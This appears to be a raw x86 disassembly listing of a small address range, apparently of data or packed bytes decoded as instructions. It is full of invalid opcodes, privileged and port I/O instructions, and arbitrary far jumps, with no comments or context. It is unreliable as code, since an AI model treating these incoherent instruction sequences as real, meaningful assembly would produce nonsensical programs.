  41055f:	jne    0x41056f
  410561:	fs std 
  410563:	cmp    eax,0xe27c3279
  410568:	and    DWORD PTR [esi],eax
  41056a:	scas   eax,DWORD PTR es:[edi]
  41056b:	shl    DWORD PTR [esi+0x7096dec3],cl
  410571:	push   0xffffff88
  410573:	out    dx,al
  410574:	call   0x948fb693
  410579:	xchg   edi,eax
  41057a:	add    BYTE PTR ds:0x8cb74ccc,bh
  410580:	push   0xffffffb0
  410582:	sbb    edi,DWORD PTR [ebp+ecx*2+0x719d1997]
  410589:	loope  0x4105b5
  41058b:	cld    
  41058c:	out    0x10,al
  41058e:	loope  0x410528
  410590:	mov    cs,WORD PTR [ebx]
  410592:	mov    esi,DWORD PTR [ebp+0x75b99d35]
  410598:	imul   ecx,esi,0xffffff84
  41059b:	adc    DWORD PTR [edi-0x59],0xb6f79017
  4105a2:	inc    ecx
  4105a3:	mov    eax,0x4bd5361e
  4105a8:	pop    eax
  4105a9:	fst    st(4)
  4105ab:	lods   eax,DWORD PTR ds:[esi]
  4105ac:	push   eax
  4105ad:	std    
  4105ae:	inc    edx
  4105af:	mov    ch,0x91
  4105b1:	iret   
  4105b2:	into   
  4105b3:	or     BYTE PTR [eax-0x52e847f0],bl
  4105b9:	dec    edx
  4105ba:	xchg   edx,eax
  4105bb:	bound  eax,QWORD PTR ds:0x127fb8f4
  4105c1:	hlt    
  4105c2:	repz add al,0x7a
  4105c5:	fcom   DWORD PTR [ecx-0xc]
  4105c8:	lds    ebp,FWORD PTR [ecx-0x5b]
  4105cb:	ret    0x9756
  4105ce:	rcr    esp,cl
  4105d0:	sti    
  4105d1:	mov    ds:0x5cd7c549,eax
  4105d6:	or     al,0x26
  4105d8:	leave  
  4105d9:	fs xchg ebp,eax
  4105db:	and    eax,0x781620e1
  4105e0:	pop    ebx
  4105e1:	add    eax,0xef05e427
  4105e6:	mov    dl,0x2d
  4105e8:	retf   0xc8ce
  4105eb:	mov    WORD PTR [esi],es
  4105ed:	aam    0xf9
  4105ef:	aaa    
  4105f0:	in     eax,dx
  4105f1:	sub    edi,DWORD PTR [ecx]
  4105f3:	call   0x1923:0xda8e9c82
  4105fa:	and    bl,0xe7
  4105fd:	mov    dl,0x74
  4105ff:	dec    eax
  410600:	inc    ebx
  410601:	retf   0xc629
  410604:	inc    eax
  410605:	push   ecx
  410606:	adc    DWORD PTR [edi-0x24f8be18],esp
  41060c:	xchg   cl,al
  41060e:	sub    al,0xbb
  410610:	sar    DWORD PTR [edi-0x7a],1
  410613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410614:	iret   
  410615:	inc    esp
  410616:	ficomp WORD PTR [ebp-0x54]
  410619:	popf   
  41061a:	add    eax,0xcf8d00e0
  41061f:	push   eax
  410620:	sbb    eax,0x334e05af
  410625:	cli    
  410626:	inc    edi
  410627:	sbb    BYTE PTR [ebp+eiz*2+0x7531b1c1],cl
  41062e:	push   esi
  41062f:	aaa    
  410630:	inc    ebp
  410631:	bound  esi,QWORD PTR [edx]
  410633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410634:	pop    ebp
  410635:	repz jmp 0x46db99cc
  41063b:	mov    esp,0x3d9df0d3
  410640:	or     esi,esi
  410642:	imul   DWORD PTR [esp+esi*1]
  410645:	data16 jns 0x4106be
  410648:	(bad)  
  410649:	mov    eax,0x811b4063
  41064e:	pop    edi
  41064f:	push   ds
  410650:	xlat   BYTE PTR ds:[ebx]
  410651:	sahf   
  410652:	inc    ecx
  410653:	test   BYTE PTR [edx+0x6f6e291e],dh
  410659:	push   ebp
  41065a:	pop    edi
  41065b:	and    eax,0xce65751c
  410660:	xor    eax,0x1baaa7a
  410665:	(bad)  
  410666:	out    0x36,eax
  410668:	dec    ebx
  410669:	xor    ah,bh
  41066b:	pushf  
  41066c:	xor    eax,0x5205e11f
  410671:	jp     0x410604
  410673:	mov    edx,0x665ce80b
  410678:	xor    edi,DWORD PTR [ebx-0x35]
  41067b:	cmp    al,0x23
  41067d:	mov    ecx,0x5253ba0c
  410682:	inc    eax
  410683:	pop    ss
  410684:	xchg   esp,eax
  410685:	sbb    eax,0x87a50530
  41068a:	in     eax,0x7b
  41068c:	rcr    BYTE PTR gs:[ebx],1
  41068f:	daa    
  410690:	mov    ?,ecx
  410692:	lods   al,BYTE PTR ds:[esi]
  410693:	mov    edx,0x2e41be82
  410698:	fwait
  410699:	mov    bh,0xa0
  41069b:	push   DWORD PTR [eax+0x28e7657a]
  4106a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106a2:	imul   eax,DWORD PTR [edx+0x71],0x3
  4106a6:	pop    ss
  4106a7:	sub    BYTE PTR [eax],cl
  4106a9:	int    0xb8
  4106ab:	scas   al,BYTE PTR es:[edi]
  4106ac:	jmp    0x8fef:0x8ff
  4106b2:	(bad)  
  4106b3:	mov    bl,0x72
  4106b5:	mov    dh,0x9d
  4106b7:	enter  0x1078,0x7e
  4106bb:	dec    ecx
  4106bc:	(bad)  
  4106bd:	mov    ds:0x16ec9444,eax
  4106c2:	jbe    0x41065e
  4106c4:	jl     0x4106b7
  4106c6:	push   ebp
  4106c7:	out    dx,eax
  4106c8:	dec    edi
  4106c9:	loopne 0x410702
  4106cb:	into   
  4106cc:	je     0x41073d
  4106ce:	cli    
  4106cf:	repz das 
  4106d1:	(bad)  
  4106d2:	in     eax,dx
  4106d3:	and    eax,0x7a759fff
  4106d8:	in     eax,dx
  4106d9:	retf   
  4106da:	push   eax
  4106db:	jno    0x4106d5
  4106dd:	fmul   QWORD PTR [ecx-0x7cd75e8]
  4106e3:	sub    eax,DWORD PTR [edx*2+0x493ac7f6]
  4106ea:	out    dx,eax
  4106eb:	mov    edi,0xb44acd7f
  4106f0:	cmp    al,BYTE PTR [eax+0x66]
  4106f3:	lds    ebp,FWORD PTR [esi+0x4885cb7d]
  4106f9:	and    BYTE PTR [edx],bh
  4106fb:	call   0x1aef:0x8fb5df0d
  410702:	sbb    ecx,edi
  410704:	jne    0x4106b3
  410706:	sub    DWORD PTR [edx],esi
  410708:	xor    DWORD PTR [edi-0x2c3e2628],edx
  41070e:	and    ecx,esi
  410710:	xor    ecx,edi
  410712:	cmp    DWORD PTR [ecx],ebp
  410714:	jmp    0x4106a4
  410716:	sbb    dh,cl
  410718:	sub    al,0x59
  41071a:	inc    edx
  41071b:	in     eax,dx
  41071c:	sub    cl,BYTE PTR [ecx+0x2bb1eade]
  410722:	das    
  410723:	dec    edi
  410724:	repz jmp 0x4106cf
  410727:	outs   dx,DWORD PTR ds:[esi]
  410728:	mov    esp,0x8fb6182f
  41072d:	push   edi
  41072e:	mov    ch,0xdd
  410730:	dec    ebx
  410731:	xor    cl,ch
  410733:	sbb    al,0xfa
  410735:	int    0xeb
  410737:	mov    WORD PTR [edi],?
  410739:	stc    
  41073a:	fnsave [edi+0x6ddc542d]
  410740:	loope  0x41079c
  410742:	leave  
  410743:	or     BYTE PTR [edi-0x63],bh
  410746:	cdq    
  410747:	jle    0x4107ae
  410749:	add    bh,BYTE PTR [ebx]
  41074b:	inc    ebx
  41074c:	mov    edi,0x72ba68d3
  410751:	movd   DWORD PTR [esi],mm6
  410754:	jb     0x4107ac
  410756:	sbb    eax,0x92d4197a
  41075b:	jmp    0x41075b
  41075d:	lock and eax,0x6b24b62e
  410763:	jg     0x41077d
  410765:	shr    DWORD PTR [esi+0x3fb0217b],cl
  41076b:	arpl   WORD PTR [ecx+0x6c],bp
  41076e:	clc    
  41076f:	or     BYTE PTR [ecx],bl
  410771:	addr16 pop esp
  410773:	out    0x6,eax
  410775:	arpl   WORD PTR [edi],si
  410777:	dec    edi
  410778:	mov    ds:0x1f4d5886,al
  41077d:	add    al,BYTE PTR [ecx]
  41077f:	pop    edx
  410780:	push   ebx
  410781:	retf   0xdef0
  410784:	and    BYTE PTR [edi-0x5db519d2],ch
  41078a:	sbb    cl,0x27
  41078d:	sbb    DWORD PTR [edx-0xcdef96],esp
  410793:	das    
  410794:	mov    al,ds:0x8345089f
  410799:	pop    es
  41079a:	pop    ss
  41079b:	test   eax,0xde571730
  4107a0:	xchg   ebp,ecx
  4107a2:	(bad)  
  4107a3:	cli    
  4107a4:	aad    0xd8
  4107a6:	pop    edi
  4107a7:	scas   al,BYTE PTR es:[edi]
  4107a8:	pop    ebp
  4107a9:	inc    eax
  4107aa:	inc    edx
  4107ab:	popa   
  4107ac:	mov    bh,BYTE PTR [edi-0x4c]
  4107af:	iret   
  4107b0:	sbb    DWORD PTR [ebx-0x20],edx
  4107b3:	jl     0x410735
  4107b5:	jae    0x410803
  4107b7:	js     0x410791
  4107b9:	add    bh,cl
  4107bb:	xor    BYTE PTR [ebx],al
  4107bd:	shl    DWORD PTR [edx+esi*4+0x45406f1c],1
  4107c4:	mov    WORD PTR [ebx],ss
  4107c6:	test   BYTE PTR [esi],bh
  4107c8:	arpl   cx,si
  4107ca:	pushf  
  4107cb:	out    0x57,al
  4107cd:	imul   eax,DWORD PTR [edi-0x5a],0x12a91bff
  4107d4:	dec    eax
  4107d5:	scas   al,BYTE PTR es:[edi]
  4107d6:	shr    al,0x49
  4107d9:	mov    al,ds:0x6043235
  4107de:	xchg   ebp,eax
  4107df:	cli    
  4107e0:	mov    dh,0xd4
  4107e2:	mov    WORD PTR [ebx],es
  4107e4:	mov    ebp,0x2b16a980
  4107e9:	fmul   DWORD PTR [eax*4+0x7f9fc77d]
  4107f0:	dec    si
  4107f2:	mov    dh,bl
  4107f4:	pop    edi
  4107f5:	in     al,0x14
  4107f7:	push   0xffffff94
  4107f9:	adc    eax,0x9ca9d1e1
  4107fe:	pop    ss
  4107ff:	add    bh,BYTE PTR fs:[ebp+0xca48aaf]
  410806:	inc    esi
  410807:	retf   
  410808:	cs or  eax,0xd91625e1
  41080e:	adc    DWORD PTR [edx+0x2],ebx
  410811:	and    edi,ecx
  410813:	fistp  QWORD PTR [eax-0x26807993]
  410819:	lea    edx,[edi-0x1]
  41081c:	popf   
  41081d:	nop
  41081e:	or     DWORD PTR [edi+0x14],0xffffffc0
  410822:	adc    eax,0x607c196f
  410827:	cld    
  410828:	nop
  410829:	shl    BYTE PTR [esi+0x7636a9d8],cl
  41082f:	mov    eax,edi
  410831:	or     ebp,edi
  410833:	inc    ecx
  410834:	xchg   ebp,eax
  410835:	gs sbb ebp,0xffffffb6
  410839:	shl    DWORD PTR [esi+0x63],0xf6
  41083d:	and    bh,BYTE PTR [edx-0x33118c09]
  410843:	imul   esp,DWORD PTR [ecx],0xffffff85
  410846:	jae    0x410827
  410848:	and    eax,0x3687d1bf
  41084d:	mov    dh,0xa8
  41084f:	sub    esp,eax
  410851:	xchg   ebx,eax
  410852:	pop    edi
  410853:	push   eax
  410854:	xchg   edx,eax
  410855:	ret    0x68a5
  410858:	fwait
  410859:	xchg   esi,eax
  41085a:	add    cl,bh
  41085c:	dec    esp
  41085d:	mov    bl,BYTE PTR [eax+0x54]
  410860:	and    esp,DWORD PTR [ecx-0x4ccdf2ad]
  410866:	prefetch (bad)
  410867:	or     eax,0xd19dbce8
  41086c:	pop    eax
  41086d:	daa    
  41086e:	lods   eax,DWORD PTR ds:[esi]
  41086f:	jle    0x4108ed
  410871:	jae    0x4108d2
  410873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410874:	adc    DWORD PTR [edi],ebp
  410876:	add    eax,0x6832d5f
  41087b:	sti    
  41087c:	mov    esp,0x954f3b82
  410881:	or     dl,bl
  410883:	popf   
  410884:	jle    0x410806
  410886:	inc    edx
  410887:	jbe    0x41081e
  410889:	adc    BYTE PTR ds:0xd7249ee1,ah
  41088f:	adc    DWORD PTR ds:0x482e1f1c,edx
  410895:	sub    ebp,DWORD PTR [edx-0x55]
  410898:	xchg   esp,eax
  410899:	idiv   BYTE PTR [esi+eiz*1+0x8603388]
  4108a0:	add    dh,BYTE PTR [edi]
  4108a2:	out    0x21,al
  4108a4:	popa   
  4108a5:	into   
  4108a6:	call   0x39d58d37
  4108ab:	fwait
  4108ac:	mov    ecx,0xbf7dde72
  4108b1:	push   0x286b0b84
  4108b6:	icebp  
  4108b7:	mov    al,ds:0x912a2021
  4108bc:	jb     0x410905
  4108be:	lods   al,BYTE PTR cs:[esi]
  4108c0:	lds    ebx,FWORD PTR [ebx-0x276a6bf0]
  4108c6:	stos   BYTE PTR es:[edi],al
  4108c7:	or     bh,BYTE PTR [eax-0x3b44f0f8]
  4108cd:	daa    
  4108ce:	mov    bh,0xeb
  4108d0:	das    
  4108d1:	aad    0x77
  4108d3:	int    0xaf
  4108d5:	das    
  4108d6:	icebp  
  4108d7:	jmp    0x4108cd
  4108d9:	jo     0x41093d
  4108db:	xor    al,0xc2
  4108dd:	cld    
  4108de:	out    dx,eax
  4108df:	cli    
  4108e0:	push   ds
  4108e1:	(bad)  
  4108e2:	mov    dh,0x2e
  4108e4:	in     eax,0xd3
  4108e6:	or     al,0xeb
  4108e8:	andnps xmm3,XMMWORD PTR [edx+0x1]
  4108ec:	inc    esi
  4108ed:	xor    BYTE PTR [ebp-0x2e],dh
  4108f0:	mov    dl,0xae
  4108f2:	jge    0x4108cb
  4108f4:	xchg   edi,eax
  4108f5:	push   edi
  4108f6:	cmp    DWORD PTR [eax+eiz*1],0xffffff99
  4108fa:	sbb    BYTE PTR [edx+0x16],bl
  4108fd:	add    ch,BYTE PTR [edx]
  4108ff:	adc    dh,BYTE PTR [esi-0x17]
  410902:	sub    DWORD PTR [ebx+0x250ad46e],ebx
  410908:	fsub   QWORD PTR [ebx+0x69752356]
  41090e:	imul   esi,DWORD PTR [edi-0x73],0x15
  410912:	nop
  410913:	inc    ecx
  410914:	mov    dl,0xb9
  410916:	imul   esp,DWORD PTR [ecx],0x69
  410919:	fild   DWORD PTR [ebp-0x6e08f054]
  41091f:	ins    DWORD PTR es:[edi],dx
  410920:	or     eax,0x391ce103
  410925:	bound  edi,QWORD PTR ds:0xa42c596a
  41092b:	sar    DWORD PTR [eax+0x52],1
  41092e:	xchg   esp,eax
  41092f:	aad    0xd9
  410931:	(bad)  
  410932:	dec    edi
  410933:	jno    0x4109b1
  410935:	lds    ecx,FWORD PTR [ebx+edx*2]
  410938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410939:	dec    edx
  41093a:	int    0xce
  41093c:	xchg   edx,eax
  41093d:	ret    0x4e3
  410940:	dec    esp
  410941:	mov    edi,0xe60881f6
  410946:	mov    bh,0x69
  410948:	pop    edx
  410949:	in     eax,dx
  41094a:	jl     0x410908
  41094c:	inc    edi
  41094d:	sub    DWORD PTR [ecx-0x470a5731],edx
  410953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410954:	fcom   QWORD PTR [edx*2+0x16c4ed7]
  41095b:	lidtd  [ecx+0x9cbcb90]
  410962:	cmp    eax,0xc3d50d73
  410967:	sbb    eax,0x647516bd
  41096c:	ja     0x410917
  41096e:	sbb    eax,0x2fb44868
  410973:	scas   eax,DWORD PTR es:[edi]
  410974:	jg     0x410922
  410976:	cmp    BYTE PTR [edx],al
  410978:	mov    dl,0xbc
  41097a:	ja     0x41097e
  41097c:	ja     0x410960
  41097e:	cld    
  41097f:	mov    ebx,0xded92763
  410984:	les    esp,FWORD PTR [ebx-0x7f8d4289]
  41098a:	les    ebp,FWORD PTR [edi+0x2b6872ba]
  410990:	ja     0x4109dc
  410992:	dec    eax
  410993:	inc    eax
  410994:	and    BYTE PTR [edi+0x76ca70b5],cl
  41099a:	jnp    0x410922
  41099c:	jmp    0xd991b3c3
  4109a1:	jle    0x410a19
  4109a3:	stc    
  4109a4:	fisubr WORD PTR [edx-0x223c407d]
  4109aa:	xchg   bh,al
  4109ac:	and    eax,0xc172a998
  4109b1:	lea    eax,ds:0x921e268f
  4109b7:	jo     0x410962
  4109b9:	push   ss
  4109ba:	mov    cs:0x88aa31b0,al
  4109c0:	mov    ebp,0x53315c7a
  4109c5:	addr16 test al,0xc9
  4109c8:	cmc    
  4109c9:	add    DWORD PTR [edi+edx*1-0x4464a30c],0xfffffffe
  4109d1:	or     DWORD PTR [edi+0x388dca2b],0x788e9a60
  4109db:	and    DWORD PTR [esi],esp
  4109dd:	jp     0x410a36
  4109df:	xchg   al,ch
  4109e1:	pop    ebp
  4109e2:	jne    0x4109d1
  4109e4:	add    al,0x66
  4109e6:	sbb    DWORD PTR [ecx],0x8c01dc54
  4109ec:	push   0xe8bfece7
  4109f1:	and    ebx,DWORD PTR [edi+0x44433979]
  4109f7:	cwde   
  4109f8:	push   cs
  4109f9:	je     0x410a74
  4109fb:	push   esi
  4109fc:	mov    cl,0xa5
  4109fe:	pop    ss
  4109ff:	sbb    DWORD PTR [edi-0x2671022a],ecx
  410a05:	jbe    0x410a0d
  410a07:	add    eax,0x4ace1e16
  410a0c:	pop    ds
  410a0d:	push   eax
  410a0e:	(bad)  
  410a10:	inc    edx
  410a11:	in     eax,0x48
  410a13:	sbb    bl,dh
  410a15:	jmp    0xe1daec84
  410a1a:	retf   0x14fd
  410a1d:	sti    
  410a1e:	loop   0x4109f6
  410a20:	mov    ds:0xa0dd56ff,al
  410a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a26:	cmp    edi,DWORD PTR [eax+0x58]
  410a29:	push   0x30e631c4
  410a2e:	adc    BYTE PTR [edi-0x4ceeee3a],dh
  410a34:	outs   dx,BYTE PTR ds:[esi]
  410a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a36:	adc    DWORD PTR [eax],esp
  410a38:	stos   BYTE PTR es:[edi],al
  410a39:	inc    ecx
  410a3a:	mov    ch,0x67
  410a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a3d:	cmp    al,0xf4
  410a3f:	xchg   ebp,eax
  410a40:	push   0xfffffff5
  410a42:	inc    esi
  410a43:	leave  
  410a44:	mov    eax,ebx
  410a46:	sbb    DWORD PTR [edi-0x74217e03],esi
  410a4c:	rcl    dh,1
  410a4e:	push   ecx
  410a4f:	dec    edi
  410a50:	mov    dl,0x89
  410a52:	or     BYTE PTR [ecx+0x19],al
  410a55:	data16 or al,0x90
  410a58:	je     0x410a0d
  410a5a:	jbe    0x410acd
  410a5c:	or     ah,BYTE PTR gs:[ebx+0x758494db]
  410a63:	adc    al,0x31
  410a65:	(bad)  
  410a67:	inc    esp
  410a68:	sub    DWORD PTR [ebp+0x42],0x22f86075
  410a6f:	mov    ebp,0xad10234b
  410a74:	push   ebp
  410a75:	add    eax,0x7e3cbf36
  410a7a:	lock loop 0x410a76
  410a7d:	sub    ch,BYTE PTR [ebx-0x27]
  410a80:	xchg   esp,eax
  410a81:	ret    
  410a82:	adc    al,0x85
  410a84:	sbb    ah,ah
  410a86:	jo     0x410a8d
  410a88:	shl    BYTE PTR [eax+0x7d],1
  410a8b:	(bad)  
  410a8c:	jne    0x410a66
  410a8e:	fnstenv [ecx]
  410a90:	popf   
  410a91:	out    0xdb,eax
  410a93:	xor    al,0x95
  410a95:	mov    fs,WORD PTR [eax-0x74]
  410a98:	sar    DWORD PTR [ecx-0x3a7d4430],cl
  410a9e:	fstp   TBYTE PTR [esi]
  410aa0:	sbb    bl,ch
  410aa2:	out    dx,al
  410aa3:	scas   eax,DWORD PTR es:[edi]
  410aa4:	mov    dh,0x64
  410aa6:	pop    ebx
  410aa7:	int3   
  410aa8:	dec    ebx
  410aa9:	in     eax,0xd6
  410aab:	adc    al,0xcc
  410aad:	inc    edx
  410aae:	dec    edi
  410aaf:	pop    ds
  410ab0:	dec    edi
  410ab1:	pop    eax
  410ab2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410ab4:	test   BYTE PTR [eax],al
  410ab6:	dec    ebp
  410ab7:	jecxz  0x410aae
  410ab9:	imul   ecx,DWORD PTR ds:0x6643ca2a,0xe2a13932
  410ac3:	les    eax,FWORD PTR [esi]
  410ac5:	std    
  410ac6:	jno    0x410b38
  410ac8:	inc    edi
  410ac9:	sahf   
  410aca:	fucomp st(4)
  410acc:	daa    
  410acd:	dec    eax
  410ace:	sbb    al,al
  410ad0:	jecxz  0x410a64
  410ad2:	(bad)  
  410ad3:	pop    ss
  410ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ad5:	jl     0x410a57
  410ad7:	mov    ?,WORD PTR [ebx]
  410ad9:	lock adc DWORD PTR [esi-0x15],ecx
  410add:	push   ebp
  410ade:	cli    
  410adf:	leave  
  410ae0:	fsubr  st,st(6)
  410ae2:	jmp    0x410b06
  410ae4:	(bad)  
  410ae5:	jmp    0x410b28
  410ae7:	test   BYTE PTR ds:0x7d45893f,cl
  410aed:	(bad)  
  410aee:	mov    ecx,0x42512256
  410af3:	test   BYTE PTR [eax-0x25],bh
  410af6:	and    bh,BYTE PTR [eax+ecx*1]
  410af9:	rcl    BYTE PTR [ecx],cl
  410afb:	xlat   BYTE PTR ds:[ebx]
  410afc:	push   ds
  410afd:	push   edx
  410afe:	inc    ecx
  410aff:	sbb    dl,bl
  410b01:	test   al,0x7
  410b03:	dec    eax
  410b04:	call   0x6908:0x6bcce367
  410b0b:	dec    ebx
  410b0c:	loopne 0x410b5f
  410b0e:	push   es
  410b0f:	ror    ah,0xa3
  410b12:	popf   
  410b13:	outs   dx,DWORD PTR ds:[esi]
  410b14:	ret    
  410b15:	cmp    DWORD PTR [ecx+esi*8+0x1dc50220],ebx
  410b1c:	enter  0x7633,0xf1
  410b20:	pop    ss
  410b21:	inc    esi
  410b22:	sub    dh,BYTE PTR [ecx]
  410b24:	mov    edi,0x2330d051
  410b29:	mov    edi,DWORD PTR [esi-0x41]
  410b2c:	push   ecx
  410b2d:	jle    0x410afb
  410b2f:	(bad)  
  410b30:	js     0x410b56
  410b32:	lock std 
  410b34:	fistp  WORD PTR [edx]
  410b36:	cld    
  410b37:	je     0x410ad5
  410b39:	pop    edx
  410b3a:	ds inc edx
  410b3c:	push   esi
  410b3d:	adc    esi,DWORD PTR [edx-0x76db690a]
  410b43:	dec    ebx
  410b44:	jl     0x410b10
  410b46:	and    al,0x6
  410b48:	jnp    0x410b5a
  410b4a:	loope  0x410ae7
  410b4c:	(bad)  
  410b4d:	pop    edi
  410b4e:	gs aam 0x6e
  410b51:	fsub   QWORD PTR [eax+eiz*2-0x25a843f2]
  410b58:	in     al,0x77
  410b5a:	cdq    
  410b5b:	aas    
  410b5c:	sbb    al,0x8d
  410b5e:	les    edi,FWORD PTR ds:0x807dfd2a
  410b64:	jp     0x410b3e
  410b66:	(bad)  
  410b67:	push   cs
  410b68:	fsub   st(3),st
  410b6a:	mov    dl,0x37
  410b6c:	sbb    eax,0x1127d31c
  410b71:	jb     0x410b3e
  410b73:	add    BYTE PTR [esi-0x69],ch
  410b76:	jmp    0x412f:0xf01699a
  410b7d:	dec    esi
  410b7e:	pop    esi
  410b7f:	cmp    ebx,edi
  410b81:	adc    BYTE PTR [ebx+ecx*4-0x3b30106b],bh
  410b88:	ret    
  410b89:	test   edx,edi
  410b8b:	(bad)  
  410b8c:	jmp    FWORD PTR [edx]
  410b8e:	jg     0x410b73
  410b90:	jno    0x410b6f
  410b92:	sahf   
  410b93:	adc    esi,DWORD PTR [edi]
  410b95:	inc    edx
  410b96:	jmp    0xd73b5c7c
  410b9b:	test   al,0xe1
  410b9d:	fidivr DWORD PTR [eax-0x38b4cc6b]
  410ba3:	xor    al,0xd3
  410ba5:	dec    ecx
  410ba6:	ins    DWORD PTR es:[edi],dx
  410ba7:	sbb    ebx,esi
  410ba9:	pop    ebp
  410baa:	outs   dx,BYTE PTR ds:[esi]
  410bab:	data16 stos BYTE PTR es:[edi],al
  410bad:	xor    DWORD PTR [ebp+0x44],ecx
  410bb0:	add    bh,BYTE PTR [ebp+0x192b6c4c]
  410bb6:	ror    BYTE PTR [ecx+ebx*1+0x462d5751],cl
  410bbd:	mov    eax,0xb7e63275
  410bc2:	xor    BYTE PTR [ebx],cl
  410bc4:	aaa    
  410bc5:	loope  0x410bc1
  410bc7:	retf   0x8cfa
  410bca:	inc    edi
  410bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bcd:	(bad)  
  410bce:	jne    0x410bb5
  410bd0:	mov    esp,0x3d99b13a
  410bd5:	addr16 popa 
  410bd7:	std    
  410bd8:	fwait
  410bd9:	ins    DWORD PTR es:[edi],dx
  410bda:	mov    ebx,DWORD PTR [ebx-0x33]
  410bdd:	outs   dx,DWORD PTR ds:[esi]
  410bde:	mov    ebp,0x14628b65
  410be3:	iret   
  410be4:	adc    edx,DWORD PTR [eax]
  410be6:	jmp    0x410b7a
  410be8:	mov    esi,0x50b28ea4
  410bed:	adc    esp,DWORD PTR [esi]
  410bef:	or     al,0xc5
  410bf1:	ret    0xd7a3
  410bf4:	dec    esi
  410bf5:	into   
  410bf6:	jbe    0x410c5b
  410bf8:	sub    eax,0xe4376ebf
  410bfd:	aam    0x84
  410bff:	xor    al,BYTE PTR [edi]
  410c01:	mov    ah,0xa2
  410c03:	gs daa 
  410c05:	push   ss
  410c06:	int3   
  410c07:	cdq    
  410c08:	je     0x410bec
  410c0a:	sbb    dl,al
  410c0c:	mov    esp,0x686fcae9
  410c11:	fmul   st,st(6)
  410c13:	or     DWORD PTR [ebp-0x66],esi
  410c16:	data16 fwait
  410c18:	sub    bl,bl
  410c1a:	test   DWORD PTR [edx+esi*8-0x72],ebx
  410c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c1f:	shr    BYTE PTR [eax-0x43],cl
  410c22:	in     eax,0xd
  410c24:	daa    
  410c25:	dec    eax
  410c26:	in     al,0x6e
  410c28:	and    bl,bl
  410c2a:	arpl   WORD PTR [edi],bx
  410c2c:	inc    edi
  410c2d:	ins    BYTE PTR es:[edi],dx
  410c2e:	jne    0x410bde
  410c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c31:	loopne 0x410bc6
  410c33:	mov    edi,0x80efcc44
  410c38:	outs   dx,DWORD PTR ds:[esi]
  410c39:	cmp    eax,0xcba40e0b
  410c3e:	(bad)  
  410c40:	sub    BYTE PTR ds:0x5cb52ec8,al
  410c46:	sbb    dl,BYTE PTR [edi]
  410c48:	fnstsw WORD PTR [ecx-0x3]
  410c4b:	call   0x7d82289a
  410c50:	out    0x9f,eax
  410c52:	add    BYTE PTR [edi-0x20],bl
  410c55:	scas   al,BYTE PTR es:[edi]
  410c56:	mov    esp,0xa14596d0
  410c5b:	mov    ch,0xb7
  410c5d:	idiv   DWORD PTR [edi]
  410c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c60:	in     eax,0x52
  410c62:	test   eax,0x679f1ec7
  410c67:	jp     0x410c09
  410c69:	outs   dx,DWORD PTR ds:[esi]
  410c6a:	or     BYTE PTR [edx+edx*1+0x3e],ah
  410c6e:	xor    esp,DWORD PTR ds:0xbc9d3250
  410c74:	sub    BYTE PTR [ebp-0x6],0x88
  410c78:	scas   eax,DWORD PTR es:[edi]
  410c79:	icebp  
  410c7a:	sahf   
  410c7b:	sub    ch,al
  410c7d:	(bad)  
  410c7e:	jl     0x410cde
  410c80:	ss arpl di,cx
  410c83:	sub    BYTE PTR [ebx+0xc6d4964],bh
  410c89:	repnz push 0x7659cf5d
  410c8f:	xchg   ebx,eax
  410c90:	and    bl,BYTE PTR [ecx+0x70]
  410c93:	pop    es
  410c94:	(bad)  
  410c95:	stos   DWORD PTR es:[edi],eax
  410c96:	jo     0x88eaf6f3
  410c9c:	fimul  DWORD PTR [edi]
  410c9e:	int    0xbf
  410ca0:	sbb    al,0x42
  410ca2:	test   BYTE PTR [ebp+0x280606a5],0xca
  410ca9:	jle    0x410cb8
  410cab:	addr16 add dh,ah
  410cae:	icebp  
  410caf:	inc    esp
  410cb0:	in     al,dx
  410cb1:	push   ss
  410cb2:	sti    
  410cb3:	imul   edi,edx,0x8093581c
  410cb9:	loope  0x410c44
  410cbb:	push   es
  410cbc:	lods   al,BYTE PTR ds:[esi]
  410cbd:	and    cl,BYTE PTR [eax]
  410cbf:	xor    DWORD PTR [eax-0x4770a58b],esp
  410cc5:	fwait
  410cc6:	mov    cl,0x70
  410cc8:	in     al,0x6d
  410cca:	ret    
  410ccb:	nop
  410ccc:	mov    dl,0xb5
  410cce:	mov    al,fs:0x26263fe2
  410cd4:	test   al,0xaf
  410cd6:	pop    ebx
  410cd7:	cs pop ebx
  410cd9:	sar    DWORD PTR [esi-0x45508bb5],1
  410cdf:	inc    eax
  410ce0:	out    dx,eax
  410ce1:	jne    0x410d27
  410ce3:	mul    esi
  410ce5:	aam    0x8c
  410ce7:	cld    
  410ce8:	xchg   edi,eax
  410ce9:	int    0xd9
  410ceb:	pop    es
  410cec:	pusha  
  410ced:	dec    ebp
  410cee:	inc    ebp
  410cef:	fst    DWORD PTR [ebp-0x590febe2]
  410cf5:	std    
  410cf6:	loop   0x410cba
  410cf8:	(bad)  
  410cf9:	ins    DWORD PTR es:[edi],dx
  410cfa:	(bad)  
  410cfb:	sub    ch,BYTE PTR [ebx-0x53408d38]
  410d01:	ins    BYTE PTR es:[edi],dx
  410d02:	pop    eax
  410d03:	sti    
  410d04:	sub    ah,BYTE PTR [edx+edi*4+0x23]
  410d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d09:	repnz push ecx
  410d0b:	pop    ebp
  410d0c:	and    BYTE PTR [eax],ch
  410d0e:	out    dx,eax
  410d0f:	xor    BYTE PTR [edx+0x10],dl
  410d12:	into   
  410d13:	adc    eax,0x8b2490ff
  410d18:	and    eax,0xcbc5e3e0
  410d1d:	out    0xc7,eax
  410d1f:	dec    esi
  410d20:	pop    edi
  410d21:	xor    al,0x8e
